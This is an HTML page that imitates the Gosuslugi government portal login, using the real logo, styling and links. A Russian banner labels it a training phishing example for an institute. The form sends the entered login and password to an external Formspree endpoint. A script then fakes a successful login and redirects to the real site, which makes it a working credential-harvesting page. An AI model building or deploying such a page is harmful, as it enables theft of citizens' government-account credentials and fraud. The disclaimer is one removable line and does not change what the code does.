<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Госуслуги — Вход</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 420px;
            margin: 40px auto;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #0066cc;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header img {
            height: 40px;
            margin-bottom: 10px;
        }
        .header h1 {
            font-size: 20px;
            font-weight: 500;
        }
        .form-container {
            padding: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 2px rgba(0,102,204,0.2);
        }
        .btn {
            background: #0066cc;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #0055aa;
        }
        .links {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        .links a {
            color: #0066cc;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #777;
            border-top: 1px solid #eee;
            margin-top: 20px;
        }
        .disclaimer {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            margin: 20px;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://www.gosuslugi.ru/static/images/logo-white.svg" alt="Госуслуги">
        <h1>Вход в личный кабинет</h1>
    </div>

    <div class="disclaimer">
        <strong>УЧЕБНЫЙ ПРИМЕР ФИШИНГА</strong><br>
        Это демонстрация для института. Данные отправляются только преподавателю.
    </div>

    <div class="form-container">
        <form id="loginForm" action="https://formspree.io/f/mkgpgwnw" method="POST">
            <div class="form-group">
                <label for="login">Телефон, СНИЛС или почта</label>
                <input type="text" id="login" name="login" required placeholder="Например, +7 999 123-45-67" />
            </div>
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required />
            </div>
            <button type="submit" class="btn">Войти</button>
        </form>

        <div class="links">
            <a href="https://www.gosuslugi.ru/help/faq/login" target="_blank">Забыли пароль?</a><br><br>
            <a href="https://www.gosuslugi.ru/" target="_blank">На главную Госуслуг</a>
        </div>
    </div>

    <div class="footer">
        © 2025 Минцифры России<br>
        Это учебная копия. Оригинал: <a href="https://esia.gosuslugi.ru/login/" style="color:#0066cc">esia.gosuslugi.ru</a>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        const login = document.getElementById('login').value;
        const password = document.getElementById('password').value;
        
        // Дополнительно: логируем в консоль (для демо)
        console.log('Попытка входа:', { login, password });

        // Показываем "вход успешен" и редиректим на Госуслуги
        setTimeout(() => {
            alert('Вход выполнен! (Это учебная имитация)');
            window.location.href = 'https://www.gosuslugi.ru/';
        }, 1000);
    });
</script>

</body>
</html>
